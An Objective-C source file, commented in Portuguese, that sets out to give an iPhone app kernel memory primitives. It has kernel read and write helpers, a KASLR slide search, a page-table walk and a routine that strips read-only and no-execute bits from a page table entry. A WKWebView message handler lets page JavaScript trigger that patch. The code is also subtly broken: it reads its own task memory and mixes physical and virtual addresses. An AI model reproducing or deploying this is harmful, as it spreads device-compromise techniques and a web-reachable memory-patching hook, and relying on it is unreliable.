#import "KernelDriver.h"
#import <mach/mach.h>
#import <unistd.h>

// DEFINIÇÕES OBRIGATÓRIAS PARA COMPILAÇÃO (A13 / iOS 26.4)
#define KERNEL_BASE_STATIC 0xFFFFFFF007004000
#define PAGE_SIZE_A13 0x4000

@implementation KernelBridge

// 1. LEITURA (kread64)
- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    vm_size_t size = sizeof(uint64_t);
    // Nota: vm_read_overwrite é a forma mais segura para o lab
    kern_return_t kr = vm_read_overwrite(mach_task_self(), (vm_address_t)addr, size, (vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
}

// 2. ESCRITA (kwrite64)
- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    uint64_t data = val;
    // Tenta escrita (Bypass de PPL será necessário no iPhone 11 real)
    vm_write(mach_task_self(), (vm_address_t)addr, (vm_offset_t)&data, 8);
}

// 3. BUSCA DE SLIDE (getKernelSlide)
- (uint64_t)getKernelSlide {
    for (uint64_t i = 0; i < 0x20000; i++) {
        uint64_t addr = KERNEL_BASE_STATIC + (i * PAGE_SIZE_A13);
        uint64_t val = [self kread64:addr];
        // Verifica o Magic Number do Mach-O
        if ((uint32_t)(val & 0xFFFFFFFF) == 0xfeedfacf) {
            return (i * PAGE_SIZE_A13);
        }
    }
    return 0;
}

// 4. LOCALIZAÇÃO DE PTE (PAGETABLE ENTRY)
- (uint64_t)get_pte_for_address:(uint64_t)vaddr {
    uint64_t slide = [self getKernelSlide];
    if (slide == 0) return 0;

    // Offset cpu_ttep para iOS 26.4 (Ajustar se necessário)
    uint64_t ttbr1_ptr = KERNEL_BASE_STATIC + slide + 0x8E10000; 
    uint64_t ttbr1 = [self kread64:ttbr1_ptr];

    // Navegação multinível (L1 -> L2 -> L3)
    uint64_t l1_idx = (vaddr >> 30) & 0x1FF;
    uint64_t l1_entry = [self kread64:(ttbr1 + (l1_idx * 8))];
    uint64_t l2_table = l1_entry & 0x0000FFFFFFFFF000ULL;

    uint64_t l2_idx = (vaddr >> 21) & 0x1FF;
    uint64_t l2_entry = [self kread64:(l2_table + (l2_idx * 8))];
    uint64_t l3_table = l2_entry & 0x0000FFFFFFFFF000ULL;

    uint64_t l3_idx = (vaddr >> 12) & 0x1FF;
    return (l3_table + (l3_idx * 8));
}

// 5. PATCH DE PERMISSÃO (PTE BYPASS)
- (void)patch_pte_make_writable:(uint64_t)vaddr {
    uint64_t pte_addr = [self get_pte_for_address:vaddr];
    uint64_t pte_val = [self kread64:pte_addr];

    // Desativa Bit 6 (RO) e bits de execução (NX)
    uint64_t new_pte = pte_val & ~( (1ULL << 6) | (1ULL << 53) | (1ULL << 54) );
    [self kwrite64:pte_addr value:new_pte];
}

// 6. PONTE WKWEBVIEW (REPLY HANDLER)
- (void)userContentController:(WKUserContentController *)u 
      didReceiveScriptMessage:(WKScriptMessage *)m 
                 replyHandler:(void (^)(id _Nullable, NSString * _Nullable))reply {
    
    NSString *act = m.body[@"action"];
    if ([act isEqualToString:@"pte_patch"]) {
        uint64_t target = strtoull([m.body[@"addr"] UTF8String], NULL, 16);
        [self patch_pte_make_writable:target];
        reply(@{@"status": @"PTE_PATCHED_REBOOT_RISK"}, nil);
    } else {
        reply(@{@"status": @"OK"}, nil);
    }
}

@end
